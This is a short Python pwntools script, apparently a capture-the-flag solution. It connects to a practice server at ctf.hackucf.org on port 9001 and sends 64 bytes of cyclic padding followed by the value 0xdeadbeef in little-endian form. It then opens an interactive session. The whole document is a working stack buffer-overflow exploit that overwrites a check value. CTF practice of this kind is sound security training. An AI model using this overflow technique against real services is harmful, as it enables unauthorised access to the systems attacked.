from pwn import *
io = remote("ctf.hackucf.org", 9001)

payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa"
payload += b"\xef\xbe\xad\xde"

io.sendline(payload)
io.interactive()